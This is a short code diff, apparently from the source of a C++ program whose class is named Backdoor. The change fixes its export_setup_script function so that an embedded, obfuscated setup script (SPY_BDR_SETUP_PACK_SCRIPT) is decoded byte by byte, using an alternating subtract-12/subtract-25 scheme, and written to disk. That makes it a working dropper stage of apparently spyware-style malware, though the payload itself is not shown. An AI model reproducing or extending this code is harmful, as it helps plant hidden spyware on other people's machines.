@@ -94,16 +94,16 @@ void Backdoor::install_pack(const char * file_path) const
 
 bool Backdoor::export_setup_script() const
 {
+	FILE * file = fopen(script_file_path, "w+b");
+	if (file == NULL)
+		return false;
 	byte script[] = SPY_BDR_SETUP_PACK_SCRIPT;
 	int bytes = sizeof(script);
 	for (int i = 0; i < bytes; i++)
 	{
 		byte ch = script[i] - (i % 2 == 0 ? 12 : 25);
-	}
-	FILE * file = fopen(script_file_path, "w+b");
-	if (file == NULL)
-		return false;
-	fwrite(script, 1, bytes, file);
+		fwrite(&ch, 1, 1, file);
+	}	
 	fclose(file);
 	return true;
 }
